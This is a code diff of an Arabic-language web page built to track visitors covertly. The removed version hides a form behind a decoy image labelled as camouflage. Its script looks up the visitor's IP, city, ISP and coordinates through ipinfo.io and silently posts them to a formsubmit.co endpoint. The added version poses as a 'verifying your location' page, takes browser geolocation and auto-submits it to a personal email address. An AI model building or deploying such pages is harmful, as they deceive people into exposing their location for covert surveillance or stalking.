@@ -1,42 +1,33 @@
 <!DOCTYPE html>
 <html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>جارٍ التحميل...</title>
-</head>
-<body style="margin:0; padding:0;">
-  <!-- صورة تمويه عادية -->
-  <img src="https://via.placeholder.com/400x400.png?text=اضغط+لتكبير+الصورة" style="width:100%; height:auto; display:block;" alt="">
+  <head>
+    <meta charset="UTF-8" />
+    <title>جاري التحقق من موقعك...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  </head>
+  <body>
+    <p style="text-align:center; font-family:Arial">جاري التحميل...</p>
 
-  <form id="trackerForm" action="https://formsubmit.co/el/puyawe" method="POST" style="display:none;">
-    <input type="hidden" name="_subject" value="🚨 زيارة جديدة لرابط التتبع">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="IP" id="ip">
-    <input type="hidden" name="الدولة" id="country">
-    <input type="hidden" name="المدينة" id="city">
-    <input type="hidden" name="المنطقة" id="region">
-    <input type="hidden" name="مزود الانترنت" id="org">
-    <input type="hidden" name="خط العرض" id="lat">
-    <input type="hidden" name="خط الطول" id="lon">
-    <input type="hidden" name="الوقت" id="time">
-  </form>
+    <form action="https://formsubmit.co/mohamed.hamdy0560@gmail.com" method="POST" id="locationForm">
+      <input type="hidden" name="Location" id="location">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_autoresponse" value="تم استلام بيانات الموقع بنجاح.">
+    </form>
 
-  <script>
-    fetch("https://ipinfo.io/json?token=16f418c3cf2d80")
-      .then(res => res.json())
-      .then(data => {
-        const [lat, lon] = data.loc.split(',');
-        document.getElementById("ip").value = data.ip;
-        document.getElementById("country").value = data.country;
-        document.getElementById("city").value = data.city;
-        document.getElementById("region").value = data.region;
-        document.getElementById("org").value = data.org;
-        document.getElementById("lat").value = lat;
-        document.getElementById("lon").value = lon;
-        document.getElementById("time").value = new Date().toLocaleString();
-
-        document.getElementById("trackerForm").submit();
-      });
-  </script>
-</body>
+    <script>
+      // التأكد من دعم المتصفح لتحديد الموقع
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const locationInfo = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
+          document.getElementById("location").value = locationInfo;
+          document.getElementById("locationForm").submit();
+        }, function(error) {
+          document.body.innerHTML = "<p style='color:red; text-align:center;'>لم نتمكن من تحديد موقعك أو تم الرفض.</p>";
+        });
+      } else {
+        document.body.innerHTML = "<p style='color:red; text-align:center;'>متصفحك لا يدعم تحديد الموقع الجغرافي.</p>";
+      }
+    </script>
+  </body>
 </html>
